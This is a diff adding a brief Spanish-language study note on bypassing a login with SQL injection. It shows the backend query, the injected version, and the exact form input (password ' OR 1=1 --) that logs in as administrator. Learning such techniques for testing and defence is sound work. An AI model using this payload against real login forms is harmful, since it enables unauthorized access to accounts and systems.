@@ -1,0 +1,11 @@
+-- Login bypass
+
+Tenemos un login que la consulta SQL ejecutada por detrás es
+SELECT username FROM users WHERE username='administrator' AND password='';
+
+Aplicando inyección SQL quedaría 
+SELECT username FROM users WHERE username='administrator' AND password=' ' OR 1=1; --';
+
+En el formulario de login sería:
+username: administrator
+password: ' OR 1=1 --
